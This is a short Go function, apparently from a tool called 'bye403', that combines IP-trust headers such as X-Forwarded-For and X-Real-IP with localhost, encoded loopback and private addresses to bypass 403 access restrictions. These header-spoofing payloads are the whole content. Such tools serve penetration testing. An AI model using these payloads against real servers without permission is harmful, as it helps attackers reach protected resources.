package main

func (b *bye403) manipulateHeaders() [][]string {
	headers := []string{
		"X-Custom-IP-Authorization", "X-Forwarded-For", 
		"X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
		"X-Remote-Addr", "X-Client-IP", "X-Real-IP",
	}

	values := []string{
		"localhost", "localhost:80", "localhost:443", 
		"127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
		"2130706433", "0x7F000001", "0177.0000.0000.0001", 
		"0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
		"172.16.0.1", "192.168.1.0", "192.168.1.1",
	}

	var header [][]string
	for _, h := range headers {
		for _, v := range values {
			header = append(header, []string{h, v})
		}
	}

	return header
}
